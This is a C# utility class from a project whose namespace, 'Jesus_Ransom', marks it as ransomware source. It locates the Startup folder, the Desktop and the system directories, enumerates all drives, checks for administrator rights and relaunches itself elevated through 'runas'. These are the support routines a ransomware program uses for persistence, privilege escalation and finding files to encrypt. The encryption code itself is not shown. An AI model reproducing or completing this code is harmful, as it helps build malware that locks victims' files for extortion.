using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Windows.Forms;

namespace Jesus_Ransom;

public class Utils
{
	private static readonly string startup = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);

	private static readonly string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private static readonly string syswow64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64";

	private static readonly string system32 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32";

	private static readonly bool is64bit = Environment.Is64BitOperatingSystem;

	public static string StartUp => startup;

	public static string Desktop => desktop;

	public static string SysWOW64 => syswow64;

	public static string System32 => system32;

	public static bool Is64Bit => is64bit;

	public static DriveInfo[] Drives => DriveInfo.GetDrives();

	public static bool IsRunAsAdmin()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool RunAsAdmin()
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
		{
			return true;
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Verb = "runas";
		processStartInfo.FileName = Process.GetCurrentProcess().MainModule!.FileName;
		processStartInfo.Arguments = "-sync";
		try
		{
			Process.Start(processStartInfo);
			Application.Exit();
		}
		catch (Win32Exception)
		{
		}
		return false;
	}

	public static string WindowsDrive()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
		string[] array = folderPath.Split(new char[1] { '\\' });
		return $"{array[0]}\\";
	}
}
